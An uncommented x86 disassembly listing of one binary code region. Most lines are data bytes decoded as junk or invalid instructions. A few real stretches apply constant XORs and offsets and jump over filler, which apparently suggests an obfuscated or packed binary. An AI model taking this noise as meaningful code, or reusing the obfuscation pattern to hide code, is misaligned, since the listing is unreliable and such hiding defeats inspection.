  40cf43:	or     eax,0xaa2bef83
  40cf48:	jae    0x40cf2c
  40cf4a:	adc    BYTE PTR [ecx+edi*4-0x6],0x44
  40cf4f:	push   ss
  40cf50:	jmp    0x56faec3a
  40cf55:	sbb    edi,DWORD PTR [ecx]
  40cf57:	ror    BYTE PTR [ebp+eax*1+0x1cafcefd],1
  40cf5e:	stc    
  40cf5f:	or     al,0x3e
  40cf61:	shl    DWORD PTR [ecx+0x4194226c],cl
  40cf67:	sahf   
  40cf68:	cmp    esp,DWORD PTR [ecx+0x4f]
  40cf6b:	(bad)  
  40cf6c:	fxch   st(5)
  40cf6e:	mov    ebx,0xda65db5e
  40cf73:	or     DWORD PTR ds:0xb3e4347f,ebp
  40cf79:	sub    edi,eax
  40cf7b:	or     ah,BYTE PTR [ebx+0x53e615af]
  40cf81:	push   0xffffffcd
  40cf83:	scas   al,BYTE PTR es:[edi]
  40cf84:	add    DWORD PTR [edi+0x71ee2c23],edx
  40cf8a:	mov    ds:0xb1b92df,eax
  40cf8f:	sbb    ah,0xa5
  40cf92:	dec    edx
  40cf93:	sbb    al,0x88
  40cf95:	inc    edx
  40cf96:	ds pop ecx
  40cf98:	push   ds
  40cf99:	adc    cl,cl
  40cf9b:	cmp    dl,ch
  40cf9d:	cli    
  40cf9e:	mov    ds:0x241dd1f5,eax
  40cfa3:	jmp    0x40cf2e
  40cfa5:	inc    ebp
  40cfa6:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	jmp    0x7e89:0x4ccc5612
  40cfcf:	jle    0x40d010
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40d044
  40cfd5:	fsubp  st(2),st
  40cfd7:	cld    
  40cfd8:	shl    DWORD PTR [esi-0x39],cl
  40cfdb:	jo     0x40cf5f
  40cfdd:	cld    
  40cfde:	sbb    DWORD PTR fs:[ebx],0xc2b299a6
  40cfe5:	and    DWORD PTR [edi+0x3ea38e00],edi
  40cfeb:	cwde   
  40cfec:	mov    ds:0xf82f57cd,al
  40cff1:	jo     0x40cfa5
  40cff3:	sbb    eax,0x487e94e6
  40cff8:	mov    eax,ds:0xc259dd42
  40cffd:	push   0x8471dcf3
  40d002:	dec    eax
  40d003:	add    ebp,ebx
  40d005:	cmp    al,0x6f
  40d007:	gs and eax,0xe99a0511
  40d00d:	out    0x0,al
  40d00f:	mov    esi,0x7bbb153e
  40d014:	add    dh,BYTE PTR [ecx]
  40d016:	xchg   edi,eax
  40d017:	rcr    BYTE PTR [ebp+0x3],1
  40d01a:	data16 icebp 
  40d01c:	and    edx,ebx
  40d01e:	(bad)  
  40d01f:	ds or  ah,bl
  40d022:	mov    esi,0x3ce466f2
  40d027:	lods   al,BYTE PTR ds:[si]
  40d029:	mov    edi,0xab814ff
  40d02e:	enter  0x156a,0x2e
  40d032:	in     al,dx
  40d033:	lea    ebp,[edi]
  40d035:	pop    ebp
  40d036:	mov    cs,ebx
  40d038:	fstp   DWORD PTR [eax]
  40d03a:	sbb    BYTE PTR [eax],ch
  40d03c:	xchg   ecx,eax
  40d03d:	fwait
  40d03e:	add    BYTE PTR [edi+ecx*8+0x2391cb4],bl
  40d045:	test   DWORD PTR [eax],0xd98b5b9e
  40d04b:	in     al,0x2d
  40d04d:	popf   
  40d04e:	or     eax,0xf674c889
  40d053:	loop   0x40cfdf
  40d055:	push   es
  40d056:	lahf   
  40d057:	or     DWORD PTR [edx],edi
  40d059:	(bad)  
  40d05a:	rcl    DWORD PTR [eax+0x39],cl
  40d05d:	inc    edi
  40d05e:	or     BYTE PTR [ebx-0x80],dh
  40d061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d062:	not    BYTE PTR [edi+0x17]
  40d065:	push   es
  40d066:	repz jae 0x40cffc
  40d069:	cmp    BYTE PTR [ebp+0x54281eab],dl
  40d06f:	aas    
  40d070:	push   ss
  40d071:	cmp    al,0xa2
  40d073:	pop    ebp
  40d074:	ror    BYTE PTR [edx+ebx*2+0x50bc0778],0x63
  40d07c:	rcl    BYTE PTR [edi],cl
  40d07e:	sub    al,0x31
  40d080:	inc    eax
  40d081:	push   ds
  40d082:	jne    0x40d062
  40d084:	fild   DWORD PTR [ebx+0x2]
  40d087:	push   cs
  40d088:	(bad)  
  40d089:	sbb    DWORD PTR [ebx+0x27e4f474],edx
  40d08f:	(bad)  
  40d090:	push   ds
  40d091:	shl    bh,0xd3
  40d094:	dec    ebx
  40d095:	jmpw   0xa826
  40d099:	cmp    eax,DWORD PTR [esi]
  40d09b:	stos   BYTE PTR es:[edi],al
  40d09c:	cli    
  40d09d:	mov    al,ds:0x390e8bca
  40d0a2:	mov    bh,0x91
  40d0a4:	mov    edi,0xd91916f4
  40d0a9:	fadd   st,st(6)
  40d0ab:	inc    ecx
  40d0ac:	pop    es
  40d0ad:	xchg   edx,eax
  40d0ae:	jecxz  0x40d09f
  40d0b0:	sub    ecx,edi
  40d0b2:	add    esi,esi
  40d0b4:	arpl   si,dx
  40d0b6:	iret   
  40d0b7:	enter  0x52be,0xfb
  40d0bb:	scas   eax,DWORD PTR es:[di]
  40d0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0be:	cld    
  40d0bf:	dec    ebp
  40d0c0:	pop    eax
  40d0c1:	je     0x40d0e6
  40d0c3:	loop   0x40d118
  40d0c5:	scas   eax,DWORD PTR es:[edi]
  40d0c6:	sbb    eax,0xba5b7e49
  40d0cb:	or     al,0xb0
  40d0cd:	aad    0x77
  40d0cf:	bound  ecx,QWORD PTR [esi+0x6f]
  40d0d2:	loope  0x40d0ba
  40d0d4:	(bad)  
  40d0d5:	xchg   ebx,eax
  40d0d6:	ficomp DWORD PTR ds:0x2519b792
  40d0dc:	les    eax,FWORD PTR [esi-0x52]
  40d0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0e0:	(bad)  [edx+0x17]
  40d0e3:	fisub  WORD PTR [esi+0x57]
  40d0e6:	cli    
  40d0e7:	dec    esp
  40d0e8:	mov    ds:0xb9d34c0e,eax
  40d0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0ee:	outs   dx,DWORD PTR ds:[esi]
  40d0ef:	cs cmc 
  40d0f1:	hlt    
  40d0f2:	cli    
  40d0f3:	retf   
  40d0f4:	and    al,0xb
  40d0f6:	fld    st(3)
  40d0f8:	push   cs
  40d0f9:	sbb    dl,BYTE PTR [ebp+0x2b]
  40d0fc:	sub    DWORD PTR [edi-0x70],ebp
  40d0ff:	out    dx,eax
  40d100:	nop
  40d101:	add    ebp,esi
  40d103:	out    dx,eax
  40d104:	fs dec edx
  40d106:	push   esi
  40d107:	pusha  
  40d108:	cmp    ebp,DWORD PTR [ecx+0x2d68ffec]
  40d10e:	out    0x7f,al
  40d110:	jae    0x40d0d3
  40d112:	mov    ds:0xd1335d5d,eax
  40d117:	mov    ecx,DWORD PTR [ebp+0x8]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	sbb    bl,0xaf
  40d160:	dec    ebp
  40d161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d162:	or     eax,0x3f7e7e8b
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d1ac
  40d16b:	add    DWORD PTR [esi+0x72],esi
  40d16e:	loopne 0x40d14e
  40d170:	lahf   
  40d171:	cli    
  40d172:	popf   
  40d173:	jo     0x40d165
  40d175:	in     eax,dx
  40d176:	jmp    FWORD PTR [edi-0xa1e9d62]
  40d17c:	je     0x40d141
  40d17e:	test   dh,0x69
  40d181:	imul   DWORD PTR [edi+0x3f]
  40d184:	or     DWORD PTR [esi],esi
  40d186:	jmp    0x2d2:0x4f2570d8
  40d18d:	in     al,dx
  40d18e:	sub    al,0x22
  40d190:	fcom   QWORD PTR [esi+0xd4f730f]
  40d196:	sub    eax,0x1ca159cf
  40d19b:	and    al,0x56
  40d19d:	int3   
  40d19e:	jmp    0x25edf56
  40d1a3:	inc    edi
  40d1a4:	mov    dl,0x0
  40d1a6:	xchg   ecx,ebx
  40d1a8:	aas    
  40d1a9:	fstp   QWORD PTR [edi-0x3e]
  40d1ac:	pop    ds
  40d1ad:	std    
  40d1ae:	mov    cl,0x1a
  40d1b0:	shl    DWORD PTR [eax-0x1d],1
  40d1b3:	(bad)
  40d1b6:	fst    QWORD PTR [edi]
  40d1b8:	mov    ch,0xd4
  40d1ba:	imul   DWORD PTR [ecx]
  40d1bc:	test   DWORD PTR [esi-0x3037ec12],edi
  40d1c2:	scas   al,BYTE PTR es:[edi]
  40d1c3:	cmc    
  40d1c4:	mov    ebx,0x63764e3d
  40d1c9:	shld   DWORD PTR [ebx-0xf],ebp,0x34
  40d1ce:	cwde   
  40d1cf:	cmp    ecx,esi
  40d1d1:	cwde   
  40d1d2:	push   esi
  40d1d3:	rol    BYTE PTR [eax-0x66],1
  40d1d6:	leave  
  40d1d7:	fs iret 
  40d1d9:	lods   eax,DWORD PTR ds:[esi]
  40d1da:	pop    ds
  40d1db:	pop    eax
  40d1dc:	xor    eax,0x55729611
  40d1e1:	dec    edi
  40d1e2:	paddd  mm4,QWORD PTR [ebx-0x57]
  40d1e6:	rcr    BYTE PTR [esi-0x64],cl
  40d1e9:	mov    gs,WORD PTR [ebp-0x40]
  40d1ec:	adc    edx,edx
  40d1ee:	out    0x7e,al
  40d1f0:	sti    
  40d1f1:	stos   DWORD PTR es:[edi],eax
  40d1f2:	dec    esp
  40d1f3:	daa    
  40d1f4:	lods   al,BYTE PTR ds:[esi]
  40d1f5:	push   cs
  40d1f6:	ror    BYTE PTR [edi],1
  40d1f8:	rcr    ecx,cl
  40d1fa:	cld    
  40d1fb:	scas   al,BYTE PTR es:[edi]
  40d1fc:	mov    al,ds:0xc42e9b81
  40d201:	push   ss
  40d202:	adc    DWORD PTR [ebp+0x73],0x58
  40d206:	mov    ds:0x3bda06f6,eax
  40d20b:	popa   
  40d20c:	jns    0x40d270
  40d20e:	ror    BYTE PTR [eax],0x10
  40d211:	jnp    0x40d1b9
  40d213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d214:	push   cs
  40d215:	mov    ecx,0x4bd9ca32
  40d21a:	ja     0x40d205
  40d21c:	pop    ecx
  40d21d:	push   ecx
  40d21e:	jecxz  0x40d203
  40d220:	int3   
  40d221:	pop    ss
  40d222:	(bad)  [edi+ebp*1]
  40d225:	mov    al,ds:0x66b3c6c
  40d22a:	test   bh,ch
  40d22c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d22e:	dec    ebp
  40d22f:	add    esp,ebp
  40d231:	sti    
  40d232:	retf   0x1d54
  40d235:	add    al,0x18
  40d237:	sahf   
  40d238:	stos   DWORD PTR es:[edi],eax
  40d239:	cld    
  40d23a:	jns    0x40d1c3
  40d23c:	adc    DWORD PTR ds:0x69d9f992,eax
  40d242:	fcmovnbe st,st(3)
  40d244:	or     al,0x78
  40d246:	add    DWORD PTR [esi-0x76],ebp
  40d249:	cmp    edi,DWORD PTR [ebx+0x565b92ba]
  40d24f:	add    ch,BYTE PTR [edx-0x3f]
  40d252:	cmp    DWORD PTR [edi],0xb3b8d089
  40d258:	std    
  40d259:	cmp    esp,DWORD PTR [esp+ebp*4+0x62]
  40d25d:	jge    0x20e6d063
  40d263:	pop    esp
  40d264:	in     al,0xcd
  40d266:	push   ds
  40d267:	jmp    0x49c2168f
  40d26c:	push   ss
  40d26d:	xchg   ecx,eax
  40d26e:	into   
  40d26f:	out    dx,al
  40d270:	jnp    0x40d269
  40d272:	mov    edi,0xb10e17b6
  40d277:	inc    edi
  40d278:	inc    ecx
  40d279:	fimul  DWORD PTR [eax]
  40d27b:	fucom  st(0)
  40d27d:	in     eax,dx
  40d27e:	add    eax,0xd4cb8f96
  40d283:	outs   dx,BYTE PTR ds:[esi]
  40d284:	in     al,dx
  40d285:	out    dx,al
  40d286:	sbb    BYTE PTR [esi-0x341b3654],ah
  40d28c:	sub    BYTE PTR [eax*8-0x5b23a167],cl
  40d293:	jne    0x40d266
  40d295:	mov    edi,0x3e61a9c9
  40d29a:	dec    ebp
  40d29b:	xchg   DWORD PTR [ecx-0x2e],ebx
  40d29e:	clc    
  40d29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2a0:	enter  0xef1e,0x23
  40d2a4:	nop
  40d2a5:	fcomi  st,st(3)
  40d2a7:	scas   al,BYTE PTR es:[edi]
  40d2a8:	pop    edx
  40d2a9:	in     al,0x7a
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	enter  0x5209,0xf
  40d2e5:	into   
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d307
  40d2ee:	xchg   BYTE PTR [eax+edi*2],bl
  40d2f1:	ret    
  40d2f2:	xchg   ebx,eax
  40d2f3:	outs   dx,BYTE PTR ds:[esi]
  40d2f4:	mov    al,0x51
  40d2f6:	sbb    BYTE PTR [ecx+eiz*8-0x77],bh
  40d2fa:	jecxz  0x40d34e
  40d2fc:	mov    dh,0xfc
  40d2fe:	sbb    cl,BYTE PTR [edi]
  40d300:	jmp    0x40d307
  40d302:	xsha256 (bad)
  40d303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d304:	xlat   BYTE PTR ds:[ebx]
  40d305:	sbb    cx,WORD PTR [edx+0x31]
  40d309:	inc    ecx
  40d30a:	sub    DWORD PTR [eiz*8-0x4743b5b1],ecx
  40d311:	xchg   esp,eax
  40d312:	test   BYTE PTR [edx+0x7b],dl
  40d315:	clc    
  40d316:	(bad)  
  40d318:	jae    0x40d34a
  40d31a:	xor    eax,0x15953703
  40d31f:	inc    ebx
  40d320:	pop    ss
  40d321:	jno    0x40d2f0
  40d323:	hlt    
  40d324:	fsub   QWORD PTR [eax+0x64e0f6d2]
  40d32a:	cmp    eax,0xad8ebb56
  40d32f:	fadd   st,st(5)
  40d331:	shr    DWORD PTR [ecx+0x3b87e637],cl
  40d337:	pop    ss
  40d338:	cmp    DWORD PTR [edi-0x70110a99],edx
  40d33e:	call   0x6c026914
  40d343:	iret   
  40d344:	cld    
  40d345:	inc    ebp
  40d346:	push   esi
  40d347:	repnz leave 
  40d349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d34a:	enter  0xb679,0x88
  40d34e:	mov    esp,0x65aa0895
  40d353:	inc    ebp
  40d354:	call   0x1898:0x179bd449
  40d35b:	or     ebp,ebx
  40d35d:	mov    ds,WORD PTR [eax]
  40d35f:	cmp    al,0xce
  40d361:	test   al,0x90
  40d363:	mov    ecx,0x75b3b0e3
  40d368:	cli    
  40d369:	fs push ebx
  40d36b:	das    
  40d36c:	daa    
  40d36d:	test   eax,0x1a34003d
  40d372:	mov    ah,0xf9
  40d374:	add    edx,DWORD PTR [esi+0x33]
  40d377:	sti    
  40d378:	push   0x75645fdc
  40d37d:	and    al,0xc6
  40d37f:	mov    ah,0x84
  40d381:	out    0xda,eax
  40d383:	jns    0x40d325
  40d385:	pop    ebx
  40d386:	or     eax,0x20938892
  40d38b:	pop    ebx
  40d38c:	inc    edx
  40d38d:	jns    0x40d3d0
  40d38f:	test   DWORD PTR [eax+ecx*8+0xf606537],ebx
  40d396:	pop    edx
  40d397:	out    dx,eax
  40d398:	or     eax,DWORD PTR [ecx-0x64]
  40d39b:	rcr    DWORD PTR [esi+0xd13b139],0x28
  40d3a2:	(bad)  
  40d3a3:	ins    DWORD PTR es:[edi],dx
  40d3a4:	repnz push ebx
  40d3a6:	xor    ebx,ebx
  40d3a8:	jge    0x40d3c1
  40d3aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3ab:	dec    ecx
  40d3ac:	lahf   
  40d3ad:	cwd    
  40d3af:	xor    esi,DWORD PTR ds:0x771abe68
  40d3b5:	shl    ah,1
  40d3b7:	test   eax,0xacb3ef10
  40d3bc:	xor    dh,BYTE PTR [ecx-0x682bfddd]
  40d3c2:	jl     0x40d400
  40d3c4:	jne    0x40d42a
  40d3c6:	fisubr DWORD PTR [esi+0xaf3228c]
  40d3cc:	daa    
  40d3cd:	push   es
  40d3ce:	adc    BYTE PTR [ebx-0x19],ah
  40d3d1:	call   0xfed4:0xe73e58d7
  40d3d8:	or     dh,cl
  40d3da:	push   edi
  40d3db:	sahf   
  40d3dc:	xchg   ax,ax
  40d3de:	dec    ecx
  40d3df:	push   ss
  40d3e0:	jg     0x40d38b
  40d3e2:	dec    BYTE PTR [edx+0x546954a3]
  40d3e8:	lods   eax,DWORD PTR ds:[esi]
  40d3e9:	popa   
  40d3ea:	arpl   WORD PTR [ecx],di
  40d3ec:	(bad)  
  40d3ed:	jle    0x40d3e9
  40d3ef:	daa    
  40d3f0:	mov    ch,0xde
  40d3f2:	into   
  40d3f3:	inc    esi
  40d3f4:	xlat   BYTE PTR ds:[ebx]
  40d3f5:	stos   BYTE PTR es:[edi],al
  40d3f6:	sbb    BYTE PTR [edi+ebx*4+0x5e],0x22
  40d3fb:	gs push es
  40d3fd:	rcr    BYTE PTR [ecx-0x5882adca],cl
  40d403:	out    dx,al
  40d404:	dec    edi
  40d405:	test   DWORD PTR [ecx],0x6ed75637
  40d40b:	jmp    0xeef6:0x75c46e9d
  40d412:	pop    ebx
  40d413:	push   ecx
  40d414:	or     al,0x58
  40d416:	push   ds
  40d417:	adc    al,0xa
  40d419:	mov    DWORD PTR [ecx+eiz*2-0x73],esi
  40d41d:	fcomp  DWORD PTR [ecx-0xa72ad0b]
  40d423:	mov    eax,0xda5e068c
  40d428:	push   edi
  40d429:	add    DWORD PTR [eax+edx*4],0x558b7a9d
  40d430:	adc    al,0x33
  40d432:	rol    DWORD PTR [ebx],0xc6
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	push   0x8fa7d1be
  40d44e:	lea    edi,[esi+0x7e]
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d475
  40d456:	aam    0x5c
  40d458:	and    cl,BYTE PTR [ebp+0x46fc16b9]
  40d45e:	push   0x5a590cc8
  40d463:	pop    esp
  40d464:	in     eax,dx
  40d465:	jo     0x40d479
  40d467:	sub    DWORD PTR [edi],esp
  40d469:	popf   
  40d46a:	pop    es
  40d46b:	mov    bl,0x5
  40d46d:	pop    eax
  40d46e:	sahf   
  40d46f:	fdivr  QWORD PTR [edx+0xa]
  40d472:	inc    eax
  40d473:	pop    esi
  40d474:	ror    bl,1
  40d476:	mov    edi,0x7eed6f2
  40d47b:	push   edi
  40d47c:	adc    BYTE PTR [edi],al
  40d47e:	pop    esi
  40d47f:	cmc    
  40d480:	frndint 
  40d482:	ins    DWORD PTR es:[edi],dx
  40d483:	mov    bh,0xd1
  40d485:	push   edx
  40d486:	(bad)  
  40d487:	mov    es,edx
  40d489:	das    
  40d48a:	and    DWORD PTR [ebx-0x3d],eax
  40d48d:	sub    BYTE PTR [edx],dl
  40d48f:	stos   WORD PTR es:[edi],ax
  40d491:	cdq    
  40d492:	cwde   
  40d493:	xchg   ebp,eax
  40d494:	dec    ecx
  40d495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d496:	xor    BYTE PTR ds:0xf9967565,0x8e
  40d49d:	xchg   ebx,eax
  40d49e:	sbb    eax,0x49830102
  40d4a3:	aas    
  40d4a4:	inc    esi
  40d4a5:	shr    edi,0x2f
  40d4a8:	imul   ebp,DWORD PTR [ebp-0x66],0xc89899e3
  40d4af:	addr16 xchg esp,eax
  40d4b1:	cwde   
  40d4b2:	mov    cl,0xd9
  40d4b4:	dec    edi
  40d4b5:	xchg   edi,eax
  40d4b6:	or     eax,0x5fa8c23f
  40d4bb:	and    al,BYTE PTR [esi]
  40d4bd:	imul   ecx,DWORD PTR [eax+esi*8-0x6],0xffffff92
  40d4c2:	or     al,0xdb
  40d4c4:	das    
  40d4c5:	or     al,0x74
  40d4c7:	into   
  40d4c8:	(bad)  
  40d4c9:	fimul  WORD PTR ds:[esi-0x5f79bae8]
  40d4d0:	cmp    DWORD PTR [edi-0x68],0x73efd41e
  40d4d7:	lock xor ebx,DWORD PTR [edi]
  40d4da:	ins    DWORD PTR es:[edi],dx
  40d4db:	andps  xmm1,XMMWORD PTR [ebx]
  40d4de:	add    eax,DWORD PTR [edx-0x27]
  40d4e1:	mov    ecx,0x32e7f168
  40d4e6:	test   al,0x2e
  40d4e9:	lea    ebx,[eax-0x7a]
  40d4ec:	out    dx,eax
  40d4ed:	das    
  40d4ee:	les    edx,FWORD PTR [eax+0x201e0ded]
  40d4f4:	inc    ebp
  40d4f5:	icebp  
  40d4f6:	dec    ebp
  40d4f7:	xchg   esp,eax
  40d4f8:	mov    esp,0x30a596fe
  40d4fd:	xchg   edx,eax
  40d4fe:	and    eax,0xa0547a7d
  40d503:	fild   WORD PTR [esi]
  40d505:	adc    edx,DWORD PTR [eax+0xf]
  40d508:	cwde   
  40d509:	iret   
  40d50a:	mov    ds:0xd0d3556e,eax
  40d50f:	arpl   WORD PTR [eax],dx
  40d511:	mov    DWORD PTR [edx+0x4a],eax
  40d514:	push   es
  40d515:	add    DWORD PTR [eax+0x35d2cc11],0x10
  40d51c:	data16 jno 0x40d517
  40d51f:	push   es
  40d520:	gs mov dl,0x7
  40d523:	mov    esi,0x353314a
  40d528:	das    
  40d529:	mov    bl,0x13
  40d52b:	int3   
  40d52c:	gs xor eax,0xd301e092
  40d532:	jnp    0x40d58f
  40d534:	mov    ch,0x1b
  40d536:	xor    eax,edi
  40d538:	cmp    BYTE PTR [ecx+ebp*1+0x50],dl
  40d53c:	dec    edi
  40d53d:	add    BYTE PTR [ebx],cl
  40d53f:	mov    al,0xac
  40d541:	sti    
  40d542:	and    BYTE PTR [ebx],bl
  40d544:	pop    ds
  40d545:	paddusb mm6,QWORD PTR [eax]
  40d548:	call   0x5ab9:0xa90095d5
  40d54f:	mov    ch,ah
  40d551:	sbb    eax,0x92e9ea8e
  40d556:	push   eax
  40d557:	jb     0x40d54b
  40d559:	push   eax
  40d55a:	mov    dl,0xee
  40d55c:	mov    dh,0x54
  40d55e:	lahf   
  40d55f:	xor    eax,ebx
  40d561:	xchg   esi,eax
  40d562:	fmul   DWORD PTR [esi+0x2e]
  40d565:	add    eax,0x4871a5e4
  40d56a:	mov    edx,0xea4a9e50
  40d56f:	sbb    eax,0x436fb9df
  40d574:	mov    al,0x65
  40d576:	jg     0x40d586
  40d578:	and    al,dl
  40d57a:	adc    esp,DWORD PTR ds:0x2f910f56
  40d580:	and    BYTE PTR [ebx+0x76fe3852],al
  40d586:	pop    ebp
  40d587:	pop    edx
  40d588:	int3   
  40d589:	pop    ecx
  40d58a:	or     eax,0xe6bb733b
  40d58f:	pop    edi
  40d590:	add    al,0x7
  40d592:	dec    edi
  40d593:	xor    ah,BYTE PTR [edx-0x47]
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xcf60fe4c
  40d5ac:	push   esi
  40d5ad:	pop    edi
  40d5ae:	inc    eax
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d591
  40d5b7:	jb     0x40d5a2
  40d5b9:	inc    eax
  40d5ba:	jl     0x40d623
  40d5bc:	pop    eax
  40d5bd:	or     DWORD PTR [eax-0x29fccf28],edx
  40d5c3:	mov    al,ds:0xc092b93
  40d5c8:	inc    edi
  40d5c9:	inc    ecx
  40d5ca:	jo     0x40d610
  40d5cc:	leave  
  40d5cd:	leave  
  40d5ce:	pop    ebx
  40d5cf:	pop    esp
  40d5d0:	es sub ch,ch
  40d5d3:	ror    BYTE PTR [ecx+0x29],0x69
  40d5d7:	nop
  40d5d8:	pop    ds
  40d5d9:	or     BYTE PTR [eax-0x1a],al
  40d5dc:	int3   
  40d5dd:	jecxz  0x40d5ac
  40d5df:	or     al,0x54
  40d5e1:	test   eax,0x49e8bd00
  40d5e6:	pop    esi
  40d5e7:	push   cs
  40d5e8:	popf   
  40d5e9:	pop    ebx
  40d5ea:	inc    eax
  40d5eb:	(bad)  
  40d5ec:	fisub  WORD PTR [eax+0x3b]
  40d5ef:	xchg   BYTE PTR [edx],dl
  40d5f1:	dec    ebp
  40d5f2:	je     0x40d616
  40d5f4:	inc    ecx
  40d5f5:	lock mov ds:0x49ae4b11,al
  40d5fb:	add    DWORD PTR [edi],edx
  40d5fd:	(bad)  
  40d5fe:	into   
  40d5ff:	lods   eax,DWORD PTR ds:[esi]
  40d600:	dec    esi
  40d601:	and    BYTE PTR [edx-0xe00bba3],ch
  40d607:	shl    dh,cl
  40d609:	push   0xcd6ce352
  40d60e:	je     0x40d638
  40d610:	daa    
  40d611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d612:	jmp    0x40d684
  40d614:	mov    ah,0x5b
  40d616:	icebp  
  40d617:	jge    0x40d618
  40d619:	in     al,dx
  40d61a:	(bad)  
  40d61b:	jno    0x40d5ed
  40d61d:	mov    eax,ds:0x334861aa
  40d622:	mov    DWORD PTR [ecx*1+0x55ea6d80],esi
  40d629:	mov    esp,0x8175b1fc
  40d62e:	mov    al,0x91
  40d630:	jmp    0xfbc2:0xf81563b1
  40d637:	loope  0x40d5e1
  40d639:	adc    eax,DWORD PTR [eax+0x32]
  40d63c:	out    0x8f,al
  40d63e:	pushw  0xff8b
  40d641:	mov    eax,0xab635c28
  40d646:	sbb    edi,DWORD PTR [edi]
  40d648:	fistp  WORD PTR [ebp-0x6bf5f24d]
  40d64e:	mov    ebp,0xfac1b51d
  40d653:	cmc    
  40d654:	rcl    DWORD PTR [edi+eiz*4-0x70],1
  40d658:	fnstsw WORD PTR [eax-0x5124cf62]
  40d65e:	dec    ecx
  40d65f:	and    DWORD PTR [eax-0x3cb9c346],esp
  40d665:	(bad)  
  40d666:	sub    al,0xf5
  40d668:	mov    edi,0xc5e6d778
  40d66d:	xchg   BYTE PTR [eax-0x6634b30f],cl
  40d673:	pusha  
  40d674:	lds    eax,FWORD PTR [ecx+0x2a]
  40d677:	mov    bh,BYTE PTR [ecx+edx*4]
  40d67a:	or     al,0x91
  40d67c:	inc    esi
  40d67d:	sub    edi,DWORD PTR [edx+0x1dfb5913]
  40d683:	or     bl,ah
  40d685:	out    dx,al
  40d686:	js     0x390b1ee2
  40d68c:	shl    eax,cl
  40d68e:	inc    edi
  40d68f:	xchg   ecx,eax
  40d690:	les    esi,FWORD PTR [edi-0x53]
  40d693:	xchg   ecx,eax
  40d694:	jmp    0x39cec3d7
  40d699:	push   esp
  40d69a:	adc    dh,bl
  40d69c:	sbb    edx,DWORD PTR [ebx]
  40d69e:	xchg   ecx,eax
  40d69f:	and    al,0x1c
  40d6a1:	jno    0x40d68d
  40d6a3:	stos   BYTE PTR es:[edi],al
  40d6a4:	in     eax,0x10
  40d6a6:	fsub   DWORD PTR [eax+0x27706fa0]
  40d6ac:	in     eax,dx
  40d6ad:	pop    esp
  40d6ae:	push   eax
  40d6af:	push   ss
  40d6b0:	cli    
  40d6b1:	das    
  40d6b2:	daa    
  40d6b3:	xor    eax,0xa649b132
  40d6b8:	xchg   ebp,eax
  40d6b9:	arpl   WORD PTR [eax],ax
  40d6bb:	pusha  
  40d6bc:	js     0x40d66e
  40d6be:	cmp    al,0xaa
